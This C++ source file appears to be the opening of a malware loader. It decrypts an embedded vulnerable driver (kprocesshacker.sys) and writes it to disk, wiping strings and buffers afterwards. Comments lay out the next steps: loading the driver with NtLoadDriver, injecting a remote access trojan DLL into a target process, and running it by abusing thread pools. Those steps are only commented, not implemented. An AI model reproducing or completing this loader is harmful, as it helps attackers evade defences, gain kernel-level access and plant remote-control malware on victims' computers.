#include <vector>
#include <windows.h>
#include <fstream>
#include "byte_encryption.h"
#include "resources.h"
#include "junk_codes.h"

//typedef NTSTATUS (*NTAPI RtlAdjustPrivilege_t)(
//    ULONG Privilege,
//    BOOLEAN Enable,
//    BOOLEAN Client,
//    PBOOLEAN WasEnabled
//);

int main(int argc, char** argv)
{
	// Load the vulnerable driver: kprocesshacker.sys
    /*
    * Decrypt the driver from memory
    * Write the driver to disk (to System32)
    * Create the registry path
    * call NtLoadDriver()
    * - Possibly unload the driver after injecting
    */
    
    std::string kprocesshackerDriverDesiredPath = decrypt_string(str_kphDriverPathOnDisk);
    std::ofstream driver_ofstream(kprocesshackerDriverDesiredPath.c_str(), std::ios::binary);
    wipeStr(kprocesshackerDriverDesiredPath);

    std::vector<uint8_t> kprocesshacker_driver = decrypt_bytes(vuln_driver);
    if (!driver_ofstream.write(reinterpret_cast<const char*>(kprocesshacker_driver.data()), kprocesshacker_driver.size()))
    {
#ifdef _DEBUG
        std::cerr << "Error: Could not write the vulnerable driver to disk." << std::endl;
#endif 
        return -1;
    }
    wipeBytes(kprocesshacker_driver);
    
    // Inject the RAT dll to the target process' virtual memory (after performing relocations)

    // Execute the AddressOfEntryPoint of the dll in the target process via abusing Thread pools (PoolParty)
    
	return 0;
}